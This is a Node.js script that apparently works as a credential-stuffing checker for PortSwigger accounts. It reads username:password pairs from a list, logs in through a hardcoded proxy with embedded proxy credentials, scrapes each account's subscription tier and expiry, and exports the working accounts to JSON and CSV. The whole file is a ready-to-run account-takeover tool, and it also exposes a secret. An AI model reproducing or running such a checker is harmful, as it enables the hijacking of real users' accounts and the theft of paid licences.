#!/usr/bin/env node

/**
 * Batch subscription extractor for all PortSwigger accounts
 * Processes all accounts in log.txt and exports results
 */

const { execSync } = require('child_process');
const fs = require('fs');

const PROXY = 'http://buymobileproxycom:mugla9392@ankara8.buymobileproxy.com:8029';
const DELAY = 200; // ms between requests (5 req/sec)

// Parse all accounts
const logFile = fs.readFileSync('log.txt', 'utf-8');
const accounts = logFile.split('\n')
    .filter(l => l.trim() && !l.startsWith('#'))
    .map(l => {
        const [username, password] = l.trim().split(':').map(x => x.trim());
        return { username, password };
    });

console.log(`[*] Processing ${accounts.length} accounts\n`);

const results = [];
let processed = 0;
let failed = 0;

// Curl helper - Windows compatible (uses temp files for POST data and cookie jar)
const path = require('path');
const os = require('os');

function curl(url, post = null, cookieJar = null) {
    try {
        let cmd;
        let tempFile;
        const cookieFlags = cookieJar ? `-b "${cookieJar}" -c "${cookieJar}"` : '';

        if (post) {
            // For POST, write data to temp file to avoid Windows shell escaping issues
            tempFile = path.join(os.tmpdir(), `curl_data_${Date.now()}_${Math.random().toString(36).substr(2, 9)}.txt`);
            const data = Object.entries(post).map(([k,v]) => `${k}=${v}`).join('&');
            fs.writeFileSync(tempFile, data);
            cmd = `curl -s -i ${cookieFlags} -x "${PROXY}" --connect-timeout 10 --max-time 20 -X POST -d @"${tempFile}" "${url}"`;
        } else {
            // GET request
            cmd = `curl -s -i ${cookieFlags} -x "${PROXY}" --connect-timeout 10 --max-time 20 "${url}"`;
        }

        if (DEBUG) console.error(`[DEBUG] Curl: ${cmd.substring(0, 100)}...`);
        const output = execSync(cmd, { encoding: 'utf-8', shell: true, maxBuffer: 50*1024*1024, timeout: 35000 });

        // Clean up temp file
        if (tempFile) {
            try { fs.unlinkSync(tempFile); } catch {}
        }

        const result = parseResponse(output);
        if (DEBUG) console.error(`[DEBUG] Status: ${result.status}, Body size: ${result.body.length}`);
        return result;
    } catch (e) {
        // Clean up temp file on error
        if (tempFile) {
            try { fs.unlinkSync(tempFile); } catch {}
        }
        if (DEBUG) console.error(`[DEBUG] Curl error: ${e.message.substring(0, 100)}`);
        return { status: 0, body: '', location: null };
    }
}

// Sleep helper
function sleep(ms) {
    const end = Date.now() + ms;
    while (Date.now() < end) {}
}

// Debug flag
const DEBUG = process.argv.includes('--debug');

// Parse response with manual redirect handling
function parseResponse(output) {
    const parts = output.split('\r\n\r\n');
    let headers = parts[0];
    let body = parts.slice(1).join('\r\n\r\n');

    // Handle proxy wrapping: actual HTTP response in body
    if (body && body.startsWith('HTTP/')) {
        const bodyParts = body.split('\r\n\r\n');
        headers = bodyParts[0];
        body = bodyParts.slice(1).join('\r\n\r\n');
    }

    const status = parseInt(headers.match(/HTTP\/\d\.\d (\d+)/)?.[1] || 0);
    const location = headers.match(/[Ll]ocation:\s*([^\r\n]+)/)?.[1]?.trim();
    return { status, body, location };
}

// Process single account
function processAccount(account) {
    const cookieJar = path.join(os.tmpdir(), `portswigger_${Date.now()}_${Math.random().toString(36).substr(2, 9)}.txt`);

    try {
        // Step 1: Get authorize endpoint and extract state
        let r = curl('https://login.portswigger.net/authorize?client_id=F1PNGMosqeuuNO5cKQzDesrY2XzvPWGz&redirect_uri=https://portswigger.net/signin-oidc&response_type=code&scope=openid+profile+email&code_challenge=BldXYnkHHNxMQttliGBK-tWU16bEzTbKyUsr9WnArgk&code_challenge_method=S256&response_mode=query', null, cookieJar);

        let state = '';
        // Try to find state in Location header first
        if (r.location) {
            const stateMatch = r.location.match(/state=([^&]+)/);
            if (stateMatch) state = stateMatch[1];
        }
        // If not found, try body
        if (!state) {
            const stateMatch = r.body.match(/state=([^&\s'"]+)/);
            if (stateMatch) state = stateMatch[1];
        }

        if (!state) {
            throw new Error('Failed to extract state parameter');
        }

        // Step 2: Login with credentials in POST body
        r = curl('https://login.portswigger.net/u/login', {
            username: account.username,
            password: account.password,
            action: 'default',
            state: state
        }, cookieJar);

        let url = r.location;
        if (!url) {
            throw new Error('Login failed - no redirect location');
        }

        // Step 3: Follow redirect chain manually
        for (let i = 0; i < 15 && url; i++) {
            if (!url.startsWith('http')) {
                url = 'https://login.portswigger.net' + url;
            }
            r = curl(url, null, cookieJar);
            url = r.location;

            // Exit if we reach portswigger.net (not login subdomain)
            if (url && url.includes('portswigger.net') && !url.includes('login')) {
                break;
            }
        }

        // Step 4: Get subscription data from my-account page
        r = curl('https://portswigger.net/#/my-account', null, cookieJar);
        const html = r.body;

        // Step 5: Parse subscription info
        let plan = 'Unknown';
        let subscription = 'Unknown';

        if (!html || html.length < 100) {
            subscription = 'Error';
            plan = 'No response';
        } else if (html.includes('You do not have any subscriptions')) {
            subscription = 'None';
            plan = 'Free/Community';
        } else {
            subscription = 'Active';
            // Check for plan type (priority order)
            if (html.toLowerCase().includes('enterprise')) plan = 'Enterprise';
            else if (html.toLowerCase().includes('team')) plan = 'Team';
            else if (html.toLowerCase().includes('professional')) plan = 'Professional';
            else if (html.toLowerCase().includes('community')) plan = 'Community';
        }

        // Extract expiry dates
        const datePattern = /(\d{1,2}[\/\-]\d{1,2}[\/\-]\d{2,4})|(\d{4}[\/\-]\d{1,2}[\/\-]\d{1,2})/g;
        const dates = html.match(datePattern);
        const expiry = dates ? dates[0] : null;

        const result = {
            username: account.username,
            plan: plan,
            subscription: subscription,
            expiry: expiry,
            status: 'OK'
        };

        // Clean up cookie jar
        try { fs.unlinkSync(cookieJar); } catch {}
        return result;

    } catch (error) {
        // Clean up cookie jar on error
        try { fs.unlinkSync(cookieJar); } catch {}
        return {
            username: account.username,
            plan: 'Unknown',
            subscription: 'Error',
            expiry: null,
            status: 'ERROR: ' + error.message.substring(0, 50)
        };
    }
}

// Get start index from args
const startIdx = process.argv.find(a => a.startsWith('--start='))
    ? parseInt(process.argv.find(a => a.startsWith('--start=')).split('=')[1])
    : 0;

// Process all accounts
console.log(`[*] Starting batch extraction (${accounts.length} accounts)...\n`);
if (startIdx > 0) console.log(`[*] Resuming from account ${startIdx}\n`);

const startTime = Date.now();
for (let i = startIdx; i < accounts.length; i++) {
    const account = accounts[i];
    try {
        const result = processAccount(account);
        results.push(result);

        if (result.status === 'OK') processed++;
        else failed++;

        // Progress indicator every 10 accounts
        if ((i + 1) % 10 === 0) {
            const elapsed = ((Date.now() - startTime) / 1000).toFixed(1);
            const rate = (i + 1 - startIdx) / (elapsed / 60);
            process.stdout.write(`\r[${i + 1}/${accounts.length}] OK: ${processed}, Failed: ${failed} | ${rate.toFixed(1)} accts/min`);
        }
    } catch (e) {
        if (DEBUG) console.error(`\n[ERROR] Account ${i}: ${e.message.substring(0, 100)}`);
        results.push({
            username: account.username,
            plan: 'Unknown',
            subscription: 'Error',
            expiry: null,
            status: 'ERROR: ' + e.message.substring(0, 50)
        });
        failed++;
    }

    sleep(DELAY); // Rate limiting
}

const totalTime = ((Date.now() - startTime) / 1000).toFixed(1);
console.log(`\n\n[✓] Completed in ${totalTime}s: ${processed} OK, ${failed} Failed\n`);

// Export JSON with timestamp
const timestamp = new Date().toISOString().replace(/[:.]/g, '-').substring(0, 19);
const jsonFile = `batch_results_${timestamp}.json`;
fs.writeFileSync(jsonFile, JSON.stringify(results, null, 2));
console.log(`[✓] Exported: ${jsonFile}`);

// Also export to batch_results.json (latest)
fs.writeFileSync('batch_results.json', JSON.stringify(results, null, 2));
console.log('[✓] Exported: batch_results.json (latest)');

// Export CSV with timestamp
const csvFile = `batch_results_${timestamp}.csv`;
const csv = [
    'Username,Plan,Subscription,Expiry,Status',
    ...results.map(r => `"${r.username.replace(/"/g, '""')}","${r.plan}","${r.subscription}","${r.expiry || ''}","${r.status}"`)
].join('\n');
fs.writeFileSync(csvFile, csv);
console.log(`[✓] Exported: ${csvFile}`);

// Also export to batch_results.csv (latest)
fs.writeFileSync('batch_results.csv', csv);
console.log('[✓] Exported: batch_results.csv (latest)');

// Summary
console.log('\n[=] SUMMARY [=]');
console.log('='.repeat(60));

const byPlan = {};
const byStatus = {};
results.forEach(r => {
    byPlan[r.plan] = (byPlan[r.plan] || 0) + 1;
    byStatus[r.subscription] = (byStatus[r.subscription] || 0) + 1;
});

console.log('\nBy Plan:');
Object.entries(byPlan).sort((a, b) => b[1] - a[1]).forEach(([plan, count]) => {
    const pct = ((count / results.length) * 100).toFixed(1);
    console.log(`  ${plan.padEnd(15)}: ${count.toString().padStart(3)} (${pct}%)`);
});

console.log('\nBy Status:');
Object.entries(byStatus).sort((a, b) => b[1] - a[1]).forEach(([status, count]) => {
    const pct = ((count / results.length) * 100).toFixed(1);
    console.log(`  ${status.padEnd(15)}: ${count.toString().padStart(3)} (${pct}%)`);
});

console.log('='.repeat(60));
console.log(`\nTotal accounts: ${results.length}`);
console.log(`Successful: ${processed} (${((processed/results.length)*100).toFixed(1)}%)`);
console.log(`Failed: ${failed} (${((failed/results.length)*100).toFixed(1)}%)`);
console.log(`Time: ${totalTime}s`);
